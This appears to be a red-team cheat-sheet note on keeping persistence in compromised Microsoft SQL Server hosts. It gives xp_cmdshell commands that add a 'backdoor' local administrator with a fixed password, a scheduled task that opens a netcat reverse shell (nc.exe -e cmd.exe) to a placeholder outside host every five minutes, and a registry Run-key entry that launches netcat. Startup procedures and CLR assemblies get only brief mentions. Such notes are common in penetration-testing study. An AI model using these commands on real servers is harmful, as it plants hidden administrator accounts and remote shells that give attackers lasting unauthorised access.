---
title: 
draft: false
tags:
  - tag1
  - tag2
NeedsReview: true
---
---

title: MSSQL Persistence - Persistence  
draft: false  
tags:

- mssql
    
- persistence
    
- registry
    
- scheduled-tasks
    
- startup-procedures  
    NeedsReview: false
    

---

> [!summary] Core Concept  
> Maintain long-term access in SQL Server environments by creating scheduled tasks, startup procedures, registry edits, or new administrative users.

### 🔻 Out — Acting on Objectives → _Persistence_

---

## 🔸 Create User + Scheduled Task

```sql
xp_cmdshell "net user backdoor P@ss123 /add"
xp_cmdshell "net localgroup administrators backdoor /add"
xp_cmdshell "schtasks /create /sc minute /mo 5 /tn updater /tr 'cmd /c nc.exe ip 443 -e cmd.exe'"
```

## 🔸 Registry Persistence

```sql
EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'backdoor', 'REG_SZ', 'cmd.exe /c start C:\\nc.exe'
```

## 🔸 Startup Stored Procedures

- Create procedure in `master` DB
    
- Mark as auto-start via `sp_procoption`
    

## 🔸 CLR Assemblies

- Load custom .NET DLL to maintain code execution
    

## 🔗 Related

- [[Execution - MSSQL]]
    
- [[Privilege Escalation - SQL Server]]
    
- [NetSPI SQL Persistence Guide](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)